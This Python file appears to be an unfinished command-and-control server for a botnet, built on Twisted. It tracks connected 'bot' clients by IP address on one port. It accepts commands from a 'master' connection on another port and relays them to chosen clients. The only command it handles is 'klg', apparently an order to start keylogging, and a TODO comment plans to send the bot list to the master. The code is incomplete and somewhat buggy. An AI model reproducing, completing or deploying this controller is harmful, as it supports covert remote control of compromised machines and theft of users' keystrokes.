#!/usr/bin/env python

from twisted.internet import protocol, reactor, endpoints

message = {} #Dict of messages
cnt_clients = 0 #Number of connected clients

class echoClient(protocol.Protocol):
    def __init__(self, factory):
        self.factory = factory

    def connectionMade(self):
        global cnt_clients
        global message
        self.peer_host = self.transport.getPeer().host
        self.peer_port = self.transport.getPeer().port
        self.factory.clients[self.peer_host] = self
        print('[*]Client %s:%s connected' %(self.peer_host, self.peer_port))
        cnt_clients += 1
        print('[%s]Clients status' %(cnt_clients))
        self.sendMessage(message)

    def connectionLost(self, reason):
        global cnt_clients
        cnt_clients -= 1
        self.factory.clients.pop(self.peer_host, None)
        print('[*] Client %s:%s disconnected' %(self.peer_host, self.peer_port))
        print('[%s] Client status ' %(cnt_clients))

    def sendMessage(self, msg):
        if msg:
            print('message %s' %(msg))
            for m_key, m_value in msg.items():
                for c_key, c_value in self.factory.clients.items():
                    if m_key == c_key:
                        #TODO Delete message in message dict after that operation is completed
                        self.factory.clients[c_key].transport.write(m_value.encode('utf-8'))
        else:
            pass

    def dataReceived(self, data):
        #TODO Parse data received
        global message
        message[self.transport.getPeer().host] = data.decode('utf-8')
        self.sendMessage(message)

class clientFactory(protocol.Factory):
    def __init__(self):
        self.clients = {}

    def buildProtocol(self, addr):
        print(addr)
        return echoClient(self)

class echoMaster(protocol.Protocol):
    def connectionMade(self):
        self.master_host = self.transport.getPeer().host
        print('*- Master [%s] connected -*' %(self.master_host))
        #TODO send bot list to Master

    def dataReceived(self, data):
        self.parseData(data)

    def connectionLost(self, reason):
        print('*- Master [%s] disconnected -*' %(self.master_host))
    
    def parseData(self, data):
        print(data)
        global message
        data = data.decode('utf-8')
        p_data = data.split(':')
        peer_ip = p_data[0]
        peer_msg = p_data[1]
        if peer_msg == 'klg':
            msg = message[peer_ip] = peer_msg

class masterFactory(protocol.Factory):
    def buildProtocol(self, addr):
        return echoMaster()

def main():
    endpoints.serverFromString(reactor, "tcp:8080:interface=127.0.0.1").listen(clientFactory())
    endpoints.serverFromString(reactor, "tcp:8081:interface=127.0.0.1").listen(masterFactory())
    reactor.run()

if __name__ == '__main__':
    main()
